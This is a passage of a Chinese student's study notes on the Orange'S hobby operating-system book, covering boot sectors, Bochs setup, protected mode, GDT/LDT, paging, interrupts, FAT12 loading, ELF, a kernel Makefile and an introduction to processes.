boot.asm -o boot.bin</code>将asm文件转为bin文件(asm文件即汇编文件，bin文件即二进制文件)</p><pre><code class="language-asm"> org 07c00h   ; 告诉编译器程序加载到7c00处 mov ax, cs mov ds, ax mov es, ax call DispStr   ; 调用显示字符串例程 jmp $   ; 无限循环DispStr: mov ax, BootMessage mov bp, ax   ; ES:BP = 串地址 mov cx, 16   ; CX = 串长度 mov ax, 01301h  ; AH = 13,  AL = 01h mov bx, 000ch  ; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮) mov dl, 0 int 10h   ; 10h 号中断 retBootMessage:  db &quot;Hello, OS world!&quot;times  510-($-$$) db 0 ; 填充剩下的空间，使生成的二进制代码恰好为512字节dw  0xaa55    ; 结束标志</code></pre><p>这里的boot文件即是引导扇区，其作用是将loader模块调入内存，且大小固定为512B，默认在磁盘的第一个扇区。</p><p>将生成的bin文件放入bochs虚拟机的文件夹。使用命令<code>dd if=boot.bin of=a.img bs=512 count=1 conv=notrunc</code>将bin文件写入软盘的第一个扇区，这里<code>conv=notrunc</code>不能删去，否则软盘会被截断(变为bin文件的大小)</p><ul><li><code>dd if=boot.bin of=a.img bs=512 count=1 conv=notrunc</code>这句话是一个命令行指令，作用是将文件boot.bin复制到a.img中的第一个扇区（512字节），覆盖原有内容而不追加。其中：<ul><li>dd：一个Linux/Unix系统下的复制工具。</li><li>if：输入文件的路径。</li><li>of：输出文件的路径。</li><li>bs：每次复制的块大小，这里是512字节。</li><li>count：复制的块数，这里是1个块（即512字节）。<br>-conv：转换选项，这里是不做任何转换（notrunc）。</li></ul></li></ul><p>随后即可运行bochs虚拟机，使用指令<code>bochs -f bochsrc</code>。</p><p>结果：视窗第一行显示<code>Hello, OS world!</code><br><img src="/images/本科//OS实验/bochs_4.jpg"></p><h2 id="%E7%AC%AC%E4%B8%89%E7%AB%A0-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F" tabindex="-1">第三章 保护模式</h2><h3 id="3.1-%E8%AE%A4%E8%AF%86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F" tabindex="-1">3.1 认识保护模式</h3><h4 id="%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83" tabindex="-1">保护模式的运行环境</h4><ol><li>从<a href="bochs.sourceforge.net/guestos/freedos-img.tar.gz">网站</a>得到FreeDOS压缩包</li><li>解压后将文件夹中的a.img重命名为freedos.img仿佛bochs虚拟机的工作目录中</li><li>使用bximage创建虚拟磁盘pm.img</li><li>修改当前bochsrc的配置文件，增加如下几行<br>floppya: 1_44=“freedos.img”, status=inserted<br>floppyb: 1_44=“pm.img”, status=inserted<br>boot: a （这里即选择bochs虚拟机的驱动磁盘）</li><li>启动bochs虚拟机，随后再终端输入 <code>format b:</code>格式化B盘</li><li>从附书磁盘中获取pmtest1.asm，挂载到软驱pm.img中<br>注意将pmtest1.asm代码第8行中07c00h改为0100h，否则最后结果无法显示<br><code>nasm pmtest1.asm -o pmtest.com</code><br><code>sudo mount -o loop pm.img /mnt/floppy/</code><br><code>sudo cp pmtest1.com /mnt/floppy/</code><br><code>sudo umount /mnt/floppy/</code></li><li>启动bochs虚拟机，即启动freedos，输入<code>dir b:</code>可查看软盘B中的内容</li><li>输入<code>b:pmtest1.com</code>即可运行该文件，可以看到以下效果<br><img src="/images/%E6%9C%AC%E7%A7%91//OS%E5%AE%9E%E9%AA%8C/3_1_1.jpg" alt="3_1_1"></li></ol><h4 id="%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%92%8C%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F" tabindex="-1">实模式和保护模式</h4><ul><li><p>CPU的实模式和保护模式是两种不同的工作状态，这两种工作状态主要用于控制CPU的访问内存和外设的方式。</p></li><li><p>实模式是CPU最初的工作状态，也是最基本的工作状态。在实模式下，CPU可以<code>直接访问内存和外设</code>，但只能使用16位的地址总线和处理器寄存器，因此内存地址的范围只能是从0到1MB。此外，在实模式下，CPU不提供对内存的保护，程序可以随意访问内存，这可能会导致内存损坏或数据丢失。</p></li><li><p>保护模式是CPU的一种高级工作状态，它提供了更高的性能和更强的内存保护。在保护模式下，CPU可以使用32位的地址总线和处理器寄存器，从而可以访问4GB的内存空间。此外，保护模式可以提供多任务处理、虚拟内存、安全性等高级功能。</p></li><li><p>在保护模式下，CPU将内存划分为许多不同的段，每个段都有自己的段描述符，用于描述该段的访问权限、基地址和长度等信息。这些段描述符是存储在内存中的数据结构，由操作系统来管理和维护。CPU访问内存时，必须遵循这些段描述符的规则，如果访问了不允许的内存区域，CPU会触发异常并终止程序的执行，从而实现了内存的保护。</p></li><li><p>为什么会有实模式？</p><ul><li>实模式最初是设计用于早期的计算机系统，在这种模式下CPU可以直接访问物理内存和外设，这种简单的访问方式可以更容易地与早期的操作系统和应用程序相兼容。但是，实模式存在许多限制，如只能使用16位的地址总线和处理器寄存器，内存保护不足等问题，这些限制已经不能满足现代计算机系统的需求。</li><li>为了满足计算机系统日益增长的复杂性和安全性需求，保护模式应运而生。保护模式提供了更多的功能和特性，如内存保护、多任务处理、虚拟内存等，这些特性使得操作系统和应用程序可以更好地控制和保护计算机系统的资源和数据，同时也提高了系统的性能和安全性。</li></ul></li><li><p>为什么现在还要有实模式到保护模式的转换，实模式不是早期计算机的吗？</p><ul><li>实模式虽然是最早的CPU工作模式之一，但是在一些情况下仍然需要将CPU从实模式切换到保护模式。主要原因有以下几个：<ul><li><ol><li>兼容性：一些操作系统或应用程序仍然需要在实模式下运行。例如，一些老旧的DOS程序和BIOS固件仅支持实模式，无法在保护模式下正常运行（这个应该是主要原因）。</li></ol></li><li><ol start="2"><li>引导程序：操作系统的引导程序（Bootloader）通常运行在实模式下，当引导程序加载完毕后，会切换到保护模式，以便操作系统可以更好地管理系统资源和内存。</li></ol></li><li><ol start="3"><li>性能：一些特殊场景需要CPU在实模式下运行，以获取更好的性能。例如，在一些嵌入式系统或低级别的驱动程序中，可能需要直接访问硬件设备或内存地址，这时可以选择在实模式下运行。</li></ol></li><li><ol start="4"><li>调试：在进行系统调试和开发过程中，将CPU从实模式切换到保护模式可以提供更丰富的调试信息和工具支持，帮助开发人员更好地进行调试和优化。</li></ol></li></ul></li></ul></li></ul><h4 id="gdt(global-descriptor-table)" tabindex="-1">GDT(Global Descriptor Table)</h4><ul><li><p>在IA32下，CPU有两种工作模式：实模式和保护模式。</p></li><li><p>保护模式下，CPU有着强大的寻址能力吗，并为强大的32为操作系统提供了更好的硬件基础。</p></li><li><p>GDT的作用是用来提供段式存储机制，这种机制是通过寄存器和GDT中的描述符共同提供的。</p></li><li><p>在实模式下，由于早期CPU为16位，其有着16位的寄存器，16位的数据总线，但有20位的地址总线，因此物理地址遵循的计算公式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>物理地址</mtext><mo>=</mo><mtext>段值</mtext><mo>∗</mo><mn>16</mn><mo>+</mo><mtext>偏移</mtext></mrow><annotation encoding="application/x-tex">物理地址 = 段值*16+偏移</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">物理地址</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">段值</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">16</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">偏移</span></span></span></span></eq>，相当于将段值左移4位再加上偏移，且段值和便宜都是16位的。</p></li><li><p>在CPU进入32位时代后，寄存器和地址线均为32位，但段值这一手段并没有被抛弃，此时引入实模式向保护模式的转变，保护模式下依然采用&quot;段：偏移&quot;这样的形式来表示，但保护模式下“段”的概念发生根本性的变化。</p><ul><li>实模式下，段值可以看作地址的一部分，从物理地址的计算公式可以看出</li><li>保护模式下，段值仅变为一个索引，这个索引指向一个数据结构的一个表项，表项中详细定义了段的起始地址，界限，属性等内容。这个数据结构，就是GDT（也可以是LDT）。GDT的表项也叫描述符(Descripter)。GDT即为全局描述符表。</li><li>因此GDT的作用是提供段式存储机制，这种机制是通过段寄存器和GDT中的描述符共同提供的</li></ul></li><li><p>下图为代码段和数据段描述符示例,此外还有系统段描述符和门描述符<br><img src="/images/%E6%9C%AC%E7%A7%91//OS%E5%AE%9E%E9%AA%8C/GDT0.jpg" alt="GDT0.jpg"></p></li><li><p>选择子结构，当TI个PRL都为0时，选择子就变成了对应描述符相当于GDT基址的偏移。<br><img src="/images/%E6%9C%AC%E7%A7%91//OS%E5%AE%9E%E9%AA%8C/%E9%80%89%E6%8B%A9%E5%AD%90.jpg" alt="选择子"></p></li><li><p>在保护模式下，寻址方式如下<img src="/images/%E6%9C%AC%E7%A7%91//OS%E5%AE%9E%E9%AA%8C/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%AF%BB%E5%9D%80.jpg" alt="保护模式下的寻址"></p></li></ul><h4 id="%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%9A%84%E4%B8%BB%E8%A6%81%E6%AD%A5%E9%AA%A4" tabindex="-1">进入保护模式的主要步骤</h4><ol><li>准备GDT</li><li>用lgdt加载gdtr</li><li>打开A20</li><li>置cr0的PE位</li><li>跳转，进入保护模式</li></ol><h4 id="%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%B1%9E%E6%80%A7" tabindex="-1">描述符属性</h4><ul><li>一致代码段，一致：<ul><li>当转移目标是一个特权级更高的一直代码段，当前特权级会被延续下去</li><li>而目标是一个特权级更高的非一致代码段，会引起常规保护错误，除非是用调用门或者任务门</li><li>目标代码的特权级低，都不能通过call或者jmp转移进去</li></ul></li></ul><p>||特权级低-&gt;高|特权级高-&gt;低|相同特权级之间|适用于何种代码<br>|-|-|-|-|<br>|一致代码段|Y|N|Y|不访问受保护的资源和某些类型的异常处理的系统代码<br>|非一致代码段|N|N|Y|避免特权级的程序访问而被保护起来的系统代码<br>|数据段（总是非一致）|N|Y|Y|</p><h3 id="3.2-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E8%BF%9B%E9%98%B6" tabindex="-1">3.2 保护模式进阶</h3><h4 id="ldt-(local-descriptor-table)" tabindex="-1">LDT (Local Descriptor Table)</h4><ul><li>LDT（Local Descriptor Table）局部描述符表，与GDT差不多，但选择子的TI位必须置为1。在运用它时，需要先使用lldt指令加载ldtr，lldt的操作数是GDT中用来描述LDT的描述符1</li><li>保护模式中“保护”二字的含义<ul><li>在描述符中段基址和段界限定义了一个段的范围，对超越段界限之外的地址访问是被禁止的，这是对段的一种保护</li><li>同时复杂的段属性对一个端的各个方面的定义规定限制了段的行为和性质，这算是一种功能保护</li></ul></li></ul><h4 id="%E7%89%B9%E6%9D%83%E7%BA%A7%E6%A6%82%E8%BF%B0" tabindex="-1">特权级概述</h4><ul><li><p>特权级</p><ul><li>在IA32的分段机制中，特权级共有4个级别，从高到低位0，1，2，3</li><li>处理器通过识别CPL，DPL，RPL这三种特权级进行特权级检验<ul><li>CPL：当前执行的程序或任务的特权级</li><li>DPL：表示段或者门的特权级</li><li>RPL：请求优先级</li></ul></li><li>特权级转移：通过jmp或call进行直接转移</li></ul></li><li><p>门：也是一种描述符，可以分为四种</p><ul><li>调用门：本质上为入口地址，但可以用来实现不同特权级代码之间的转移<ul><li>使用调用门的过程分为两个部分：</li><li><ol><li>一部分是从低特权级到高特权级，通过调用门和call指令实现</li></ol></li><li><ol start="2"><li>另一部分是从高特权级到低特权级，通过ret指令来实现</li></ol></li></ul></li><li>终端门</li><li>陷阱门</li><li>任务门</li></ul></li><li><p>TSS(Task-State Stack)</p><ul><li>TSS是一个数据结构，用于存储任务的状态信息，TSS通常与任务切换和任务管理相关联，它存储了任务的上下文、特权级别和其他与任务执行相关的信息。<ol><li>任务切换：TSS用于在任务间进行切换。当处理器从一个任务切换到另一个任务时，它会保存当前任务的上下文信息到当前任务的TSS中，然后加载新任务的上下文信息从新任务的TSS中。这个过程通常由操作系统的调度器管理。</li><li>上下文信息：TSS中存储了任务的上下文信息，包括通用寄存器、段寄存器、控制寄存器、指令指针等。在任务切换时，处理器会保存当前任务的上下文到TSS中，并在切换到新任务时加载新任务的上下文。</li><li>特权级别：TSS中也包含了任务的特权级别信息，即任务执行时所处的特权级别。这是由特权级别字段（CPL，Current Privilege Level）指示的，它决定了任务对系统资源的访问权限。</li><li>任务管理：TSS也可以用于任务管理，其中每个任务都有一个唯一的TSS。任务管理器可以使用TSS来管理任务的状态、上下文和特权级别。</li></ol></li></ul></li></ul><h3 id="3.3-%E9%A1%B5%E5%BC%8F%E5%AD%98%E5%82%A8" tabindex="-1">3.3 页式存储</h3><ul><li><ol><li>什么叫做页？<br>所谓页，就是一块内存。</li></ol></li><li><ol start="2"><li>逻辑地址，线性地址，物理地址<br>在未打开分页机制前，线性地址等同于物理地址，可以理解为逻辑地址通过分段机制直接转换为物理地址。<br>当分页开启后，分段机制将逻辑地址转换为线性地址，线性地址再通过分页机制转换成物理地址。</li></ol></li><li><ol start="3"><li>为什么分页？<br>其主要目的是实现虚拟存储器，线性地址的任何一个页都可以映射到物理地址中的任何一个页，这使得内存管理变得相当灵活。</li></ol></li><li><p>PDE页目录表，PTE页表</p></li></ul><h3 id="3.4-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8" tabindex="-1">3.4 中断和异常</h3><ul><li><p>IDT：中断描述符表，描述符可以是以下三种</p><ul><li>中断门描述符</li><li>陷阱门描述符</li><li>任务门描述符</li></ul></li><li><p>IDT作用是将每一个中断向量和一个描述符对应起来，IDT也是一种向量表</p></li><li><p>异常的三种类型</p><ul><li>Fault错误：可被更正的异常，且被更正后，程序可以不失连续性地执行</li><li>Trap陷阱：发生trap地指令执行后立即被报告的异常</li><li>Abort异常：不总是报告异常发生位置的异常，不允许程序或任务继续执行，用来报告严重错误</li></ul></li><li><p>中断产生的原因有两种</p><ul><li>一种是外部中断，即由硬件产生的中断</li><li>另一种是由指令 int n 产生的中断，n即为向量号</li></ul></li></ul><h3 id="3.5-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84i%2Fo" tabindex="-1">3.5 保护模式下的I/O</h3><p>IOPL和IO许可位图</p><h3 id="3.6-%E5%B0%8F%E7%BB%93" tabindex="-1">3.6 小结</h3><p>保护模式有以下几方面含义：</p><ul><li>在GDT，LDT以及IDT中，每个描述符都有自己的界限和属性等内容，是对描述符所描述对象的一种限定和保护</li><li>分页机制中的PDE和PTE都含有R/W以及U/S位，提供了页级保护</li><li>也是存储的使用使应用程序使用的是线性地址空间而不是物理地址，于是物理内存就被保护起来</li><li>终端不再像实模式下一样使用，也提供特权检验等内容</li><li>I/O指令不再随便使用，于是被端口保护起来</li><li>在程序运行过程中，如果遇到不同特权级间的访问等情况，会对CPL，RPL，DPL，IOPL等内容进行严格的检验，同时可能伴随堆栈的切换，这都对不同层级的程序进行了保护</li></ul><h2 id="%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E8%AE%A9%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%BF%9B%E5%85%A5%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F" tabindex="-1">第四章 让操作系统进入保护模式</h2><h3 id="4.1-%E7%AA%81%E7%A0%B4512%E5%AD%97%E8%8A%82%E9%99%90%E5%88%B6" tabindex="-1">4.1 突破512字节限制</h3><h4 id="fat12" tabindex="-1">FAT12</h4><p>FAT12文件系统的基本组成包括引导扇区（Boot Sector）、文件分配表（File Allocation Table）、根目录区（Root Directory Region）和数据区（Data Region）。</p><ul><li>引导扇区（Boot Sector）是文件系统的第一个扇区，包含了引导代码和文件系统的元数据，例如文件系统的标识、扇区大小等。引导扇区还包含一个特殊的标志，被用来指示磁盘是否可引导。</li><li>文件分配表（File Allocation Table）是一个记录文件分配信息的表格，它跟踪文件在磁盘上的存储位置。FAT12使用12位来表示每个文件的分配状态，例如是否被占用或空闲，以及文件块的链接关系。</li><li>根目录区（Root Directory Region）存储了存储设备的根目录的相关信息，包括文件名、扩展名、属性和起始簇号等。FAT12文件系统中的根目录区是固定大小的。</li><li>数据区（Data Region）是存储实际文件数据的地方。文件系统使用文件分配表中的链接关系来跟踪文件数据在数据区的存储位置。</li></ul><h4 id="loader%E6%A8%A1%E5%9D%97" tabindex="-1">loader模块</h4><p>一个操作系统从开机到运行，大致经历</p><pre><code class="language-mermaid">graph LRA[引导]--&gt;B[加载内核到内存];B--&gt;C[跳入保护模式];C--&gt;D[开始执行内核]</code></pre><p>因此在执行内核前，还需要几步，仅靠一个512B的引导扇区是无法加载内核到内存的，因此我们将这一步工作交给一个称为Loader的模块去实现，该模块没有内存限制。</p><p>一个简单的loader模块为</p><pre><code class="language-asm">org 0100h mov ax, 0B800h mov gs, ax mov ah, 0Fh    ; 0000: 黑底    1111: 白字 mov al, 'L' mov [gs:((80 * 0 + 39) * 2)], ax ; 屏幕第 0 行, 第 39 列。 jmp $    ; 到此停住</code></pre><p>随后通过<code>nasm loader.asm -o loader.bin</code>转为二进制文件，准备放入磁盘。</p><h4 id="%E5%8A%A0%E8%BD%BDloader%E5%85%A5%E5%86%85%E5%AD%98" tabindex="-1">加载Loader入内存</h4><p>这里boot首先要做出改变，首先引导扇区需要BPB头信息才能被识别，其次我们要在boot的代码里实现寻找loader模块，这里代码见书附磁盘。</p><p>随后我们就要将loader模块放入磁盘，让boot程序找到它并执行。</p><p>命令为</p><pre><code class="language-asm">nasm boot.asm -o boot.binnasm loader.asm -o loader.bindd if=boot.bin of=a.img bs=512 count=1 conv=notruncsudo mount -o loop a.img /mnt/floppy/sudo cp loader.bin /mnt/floppy/ -vsudo umount /mnt/floppy/</code></pre><p>该指令将软盘挂载到/mnt/floppy下，在将loader程序复制进去，以达到将loader放入软盘的目的，但是我的<code>mnt</code>目录下没有floppy文件夹，因此首先用指令<code>mkdir /mnt/floppy/</code>创建一个挂载软盘的区域</p><h3 id="4.2-%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" tabindex="-1">4.2 保护模式下的操作系统</h3><ul><li>Loader要做的<ul><li>加载内核到内存</li><li>跳入保护模式</li></ul></li></ul><h2 id="%E7%AC%AC%E4%BA%94%E7%AB%A0-%E5%86%85%E6%A0%B8%E9%9B%8F%E5%BD%A2" tabindex="-1">第五章 内核雏形</h2><h3 id="1-linux%E4%B8%8Basm%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%90%E8%A1%8C" tabindex="-1">1 linux下asm文件的运行</h3><p>运行hello.asm文件</p><pre><code class="language-asm">; 编译链接方法; (ld 的‘-s’选项意为“strip all”);; $ nasm -f elf hello.asm -o hello.o; $ ld -s hello.o -o hello; $ ./hello; Hello, world!; $[section .data] ; 数据在此strHello db &quot;Hello, world!&quot;, 0AhSTRLEN  equ $ - strHello[section .text] ; 代码在此global _start ; 我们必须导出 _start 这个入口，以便让链接器识别_start: mov edx, STRLEN mov ecx, strHello mov ebx, 1 mov eax, 4  ; sys_write int 0x80  ; 系统调用 mov ebx, 0 mov eax, 1  ; sys_exit int 0x80  ; 系统调用</code></pre><p>之后首先转换为.o二进制文件<br><code>nasm -f elf hello.asm -o hello.o</code><br>再进行链接得到可执行文件<br><code>ld -s hello.o -o hello</code>，然而这句话会报错，因为书中系统为32位，而目前（2023）年基本为64位机，所以我们应用指令<code>ld -m elf_i386 -s hello.o -o hello</code>生成可执行文件<br>再运行<code>./hello</code>可看到输出Hello，World!</p><h3 id="2-linux%E4%B8%8B%E6%B1%87%E7%BC%96%E5%92%8Cc%E5%90%8C%E6%AD%A5%E4%BD%BF%E7%94%A8" tabindex="-1">2 linux下汇编和C同步使用</h3><p>书中例子</p><pre><code class="language-asm">; 编译链接方法; (ld 的‘-s’选项意为“strip all”);; $ nasm -f elf foo.asm -o foo.o; $ gcc -c bar.c -o bar.o; $ ld -s hello.o bar.o -o foobar; $ ./foobar; the 2nd one; $extern choose ; int choose(int a, int b);[section .data] ; 数据在此num1st  dd 3num2nd  dd 4[section .text] ; 代码在此global _start ; 我们必须导出 _start 这个入口，以便让链接器识别。global myprint ; 导出这个函数为了让 bar.c 使用_start: push dword [num2nd] ; `. push dword [num1st] ;  | call choose  ;  | choose(num1st, num2nd); add esp, 8  ; / mov ebx, 0 mov eax, 1  ; sys_exit int 0x80  ; 系统调用; void myprint(char* msg, int len)myprint: mov edx, [esp + 8] ; len mov ecx, [esp + 4] ; msg mov ebx, 1 mov eax, 4  ; sys_write int 0x80  ; 系统调用 ret</code></pre><pre><code class="language-C">void myprint(char* msg, int len);int choose(int a, int b)&#123; if(a &gt;= b)&#123;  myprint(&quot;the 1st one\n&quot;, 13); &#125; else&#123;  myprint(&quot;the 2nd one\n&quot;, 13); &#125; return 0;&#125;</code></pre><p>使用指令来运行代码<br><code>nasm -f elf -o foo.o foo.asm</code><br><code>gcc - m32 -c -o bar.o bar.c</code>(这里和书上的不一样，这里生成32位可执行文件)<br><code>ld -m -elf_i386 -s -o foobar foo.o bar.o</code>32位链接<br><code>./foobar</code></p><p>运行结果可以根据代码得出</p><h3 id="3-elf(executable-and-linkable-format)" tabindex="-1">3 ELF(Executable and  Linkable Format)</h3><p>ELF（Executable and Linkable Format）是一种常见的可执行文件和可链接文件的标准文件格式。它被广泛用于类Unix系统（如Linux）和其他操作系统上<br>操作系统内核位ELF文件格式,该文件格式由四部分组成（ELF头，程序头表，节，节头表），只有ELF头位置固定，其余部分由ELF头位置决定</p><ul><li>文件头ELF头（File Header）：文件头位于ELF文件的开头，包含了描述整个文件的基本信息，如目标体系结构、入口点地址、段表和节表的位置和大小等。</li><li>程序头表（Program Header Table）：程序头表描述了在可执行文件加载时需要进行的段的布局和操作。每个条目描述了一个段在内存中的位置、大小、访问权限以及其他相关信息。程序头表对于可执行文件和共享库非常重要。</li></ul><h3 id="4-%E4%BB%8Eloader%E5%88%B0%E5%86%85%E6%A0%B8" tabindex="-1">4 从Loader到内核</h3><p>loader要做的两项工作：</p><ol><li>加载内核到内存</li><li>跳入保护模式</li></ol><ul><li>用loader加载ELF文件</li></ul><p>使用附书磁盘中的文件 <code>fat12hdr.inc,boot.asm,loader.asm</code>首先编译连接生成磁盘驱动(boot.asm和loader.asm中已经include过fat12hdr.ihc)，此时磁盘中仍没有内核。</p><p>此时运行驱动磁盘会显示<code>No KERNEL</code></p><p>之后使用附书磁盘的kernel.asm文件，使用命令</p><pre><code class="language-asm">nasm -f elf -o kernel.o kernel.asmld -m elf_i386 -s -o kernel.bin kernel.osudo mount -o loop a.img /mnt/floppy/sudo cp kernel.bin /mnt/floppy/ -vsudo umount /mnt/floppy/</code></pre><p>之后再运行驱动磁盘只会显示<code>Ready.字样</code>，此时已将内核加载至内存</p><ul><li>跳入保护模式</li><li>重新放置内核</li><li>向内核交出控制权</li></ul><p>以上操作按书上做即可</p><h3 id="5-%E6%89%A9%E5%85%85%E5%86%85%E6%A0%B8" tabindex="-1">5 扩充内核</h3><ul><li>切换堆栈和GDT</li><li>整理文件夹与makefile<ul><li>此后可以更快地产生驱动磁盘，made in heaven</li><li>只需<code>make image</code>即可</li></ul></li></ul><pre><code class="language-makefile">########################## Makefile for Orange'S ########################### Entry point of Orange'S# It must have the same value with 'KernelEntryPointPhyAddr' in load.inc!ENTRYPOINT= 0x30400# Offset of entry point in kernel file# It depends on ENTRYPOINTENTRYOFFSET=   0x400# Programs, flags, etc.ASM= nasmDASM= ndisasmCC= gcc -m32 -fno-stack-protectorLD= ld ASMBFLAGS= -I boot/include/ASMKFLAGS= -I include/ -f elfCFLAGS= -I include/ -c -fno-builtinLDFLAGS= -m elf_i386 -s -Ttext $(ENTRYPOINT)DASMFLAGS= -u -o $(ENTRYPOINT) -e $(ENTRYOFFSET)# This ProgramORANGESBOOT= boot/boot.bin boot/loader.binORANGESKERNEL= kernel.binOBJS= kernel/kernel.o kernel/start.o kernel/i8259.o kernel/global.o kernel/protect.o lib/klib.o lib/kliba.o lib/string.oDASMOUTPUT= kernel.bin.asm# All Phony Targets.PHONY : everything final image clean realclean disasm all buildimg# Default starting positioneverything : $(ORANGESBOOT) $(ORANGESKERNEL)all : realclean everythingfinal : all cleanimage : final buildimgclean :rm -f $(OBJS)realclean :rm -f $(OBJS) $(ORANGESBOOT) $(ORANGESKERNEL)disasm :$(DASM) $(DASMFLAGS) $(ORANGESKERNEL) &gt; $(DASMOUTPUT)# We assume that &quot;a.img&quot; exists in current folderbuildimg :dd if=boot/boot.bin of=a.img bs=512 count=1 conv=notruncsudo mount -o loop a.img /mnt/floppy/sudo cp -fv boot/loader.bin /mnt/floppy/sudo cp -fv kernel.bin /mnt/floppysudo umount /mnt/floppyboot/boot.bin : boot/boot.asm boot/include/load.inc boot/include/fat12hdr.inc$(ASM) $(ASMBFLAGS) -o $@ $&lt;boot/loader.bin : boot/loader.asm boot/include/load.inc \boot/include/fat12hdr.inc boot/include/pm.inc$(ASM) $(ASMBFLAGS) -o $@ $&lt;$(ORANGESKERNEL) : $(OBJS)$(LD) $(LDFLAGS) -o $(ORANGESKERNEL) $(OBJS)kernel/kernel.o : kernel/kernel.asm$(ASM) $(ASMKFLAGS) -o $@ $&lt;kernel/start.o: kernel/start.c include/type.h include/const.h include/protect.h \include/proto.h include/string.h$(CC) $(CFLAGS) -o $@ $&lt;kernel/i8259.o : kernel/i8259.c include/type.h include/const.h include/protect.h \include/proto.h$(CC) $(CFLAGS) -o $@ $&lt;kernel/global.o : kernel/global.c$(CC) $(CFLAGS) -o $@ $&lt;kernel/protect.o : kernel/protect.c$(CC) $(CFLAGS) -o $@ $&lt;lib/klib.o : lib/klib.c$(CC) $(CFLAGS) -o $@ $&lt;lib/kliba.o : lib/kliba.asm$(ASM) $(ASMKFLAGS) -o $@ $&lt;lib/string.o : lib/string.asm$(ASM) $(ASMKFLAGS) -o $@ $&lt;</code></pre><ul><li>添加中断处理<ul><li>这里出现了有关<code>__stack_chk_fail_local</code>的报错，上网查阅后找到解决方法</li><li>在gcc编译时加上参数<code>-fno-stack-protector</code>即可，在makefile中更改位置为<code>CC= gcc -m32 -fno-stack-protector</code></li><li>这里不知道为什么会输出乱码，急急急（未解决），但好像使用光盘上的磁盘就没问题，应该是在编译环节出现问题。</li><li>经过比对，发现光盘上的boot.asm文件在虚拟机转化为bin文件后在虚拟磁盘上的二进制数，与光盘上的虚拟磁盘上的二进制数不同，即boot文件已有区别，可能是32位机子和64位机子的问题。。。于此开始使用32位的ubuntu16.04</li></ul></li></ul><h2 id="%E7%AC%AC%E5%85%AD%E7%AB%A0-%E8%BF%9B%E7%A8%8B" tabindex="-1">第六章 进程</h2><h3 id="6.1-6.2-%E8%BF%9F%E5%88%B0%E7%9A%84%E8%BF%9B%E7%A8%8B%E4%B8%8E%E6%A6%82%E8%BF%B0" tabindex="-1">6.1-6.2 迟到的进程与概述</h3><p>进程是一个正在运行的程序的实例。它是操作系统进行资源分配和管理的基本单位。每个进程都有独立的地址空间、代码、数据和打开的文件等资源。它拥有自己的执行环境，并可以通过操作系统调度来与其他进程并发执行。进程之间是相互独立的，每个进程都在自己的地址空间中运行，并通过进程间通信（IPC）机制进行必要的数据交换。</p><p>线程是在进程内部执行的较小单位。一个进程可以包含多个线程，它们共享相同的地址空间和资源。线程在进程内并发执行，共享进程的上下文、数据和文件等资源。多线程可以实现并行处理，提高程序的性能和响应能力。线程之间的切换比进程之间的切换更轻量级，开销更小。</p><ul><li>以下是进程和线程的一些关键区别：<ul><li>资源拥有：进程是独立的执行实体，拥有自己的地址空间和资源，包括打开的文件、网络连接等。线程是进程内的执行单元，共享进程的资源。</li><li>调度和切换：进程是操作系统进行调度和切换的基本单位。线程是在进程内调度和切换的基本单位，切换开销比进程切换小。</li><li>通信和同步：不同进程之间的通信需要使用进程间通信（IPC）机制，如管道、消息队列、共享内存等。线程之间可以通过共享内存和同步原语（如锁、条件变量）进行直接通信和同步。</li><li>容错性：由于每个进程拥有独立的地址空间，一个进程的崩溃不会影响其他进程。但是，线程共享进程的地址空间，一个线程的错误可能会导致整个进程崩溃。</li></ul></li></ul><h3 id="6.3-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%9B%E7%A8%8B" tabindex="-1">6.3 最简单的进程</h3><ul><li>进程切换时的过程<ul><li><ol><li>进程A运行中</li></ol></li><li><ol start="2"><li>时钟中断发生，ring1 -&gt; ring0,时钟中断处理程序启动</li></ol></li><li><ol start="3"><li>进程调度，下一个应运行的进程(假设为B进程)被指定</li></ol></li><li><ol start="4"><li>进程B被恢复，ring0 -&gt; ring1</li></ol></li><li><ol start="5"><li>进程B运行中</li></ol></li></ul></li><li>想要实现这些功能，需要实现以下3项<ul><li>时钟中断处理程序</li><li>进程调度模块</li><li>两个进程</li></ul></li></ul><h4 id="1-%E7%AE%80%E5%8D%95%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF" tabindex="-1">1 